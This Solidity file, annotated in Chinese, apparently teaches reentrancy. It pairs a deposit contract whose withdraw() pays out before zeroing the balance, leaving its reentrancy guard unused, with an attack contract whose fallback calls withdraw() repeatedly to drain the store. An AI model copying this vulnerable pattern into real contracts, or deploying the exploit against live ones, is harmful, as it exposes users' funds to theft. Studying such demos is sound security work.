// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract CryptoCurrencyStore {
    mapping(address => uint256) public balances;

    bool public lockedState;

    modifier nonReentrant() {
        require(!lockedState, "Block re-entrancy");
        lockedState = true;
        _;
        lockedState = false;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value; //存款
    }

    function withdraw() public {
        uint256 userBalance = balances[msg.sender]; //取得使用者存款資金
        require(userBalance > 0); //檢查使用者的存款資金是否大於0

        (bool sent, ) = msg.sender.call{value: userBalance}(""); //這段會觸發攻擊者的fallback
        require(sent, "Failed to send Ether"); //sent如為false代表使用者取款失敗

        balances[msg.sender] = 0; //資金領取完畢，將餘額設置為0。
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getContractAddress() public view returns (address) {
        return address(this);
    }
}

contract AttackCryptoCurrencyStore {
    //初始化 CryptoCurrencyStore 並命名為 store
    CryptoCurrencyStore public store;

    //將CryptoCurrencyStore的智能合約地址在建構時輸入，並附值給store，
    //這樣store就能使用CryptoCurrencyStore的所有公開函式。
    constructor(address _cryptoCurrencyStoreAddress) {
        store = CryptoCurrencyStore(_cryptoCurrencyStoreAddress);
    }

    //當智能合約接收到ether時會直接觸發fallback 對應到24行
    fallback() external payable {
        if (address(store).balance >= 1 ether) {
            store.withdraw();
        }
    }

    //對 CryptoCurrencyStore 合約 執行重入攻擊
    function attack() external payable {
        require(msg.value >= 1 ether);
        store.deposit{value: 1 ether}();
        store.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
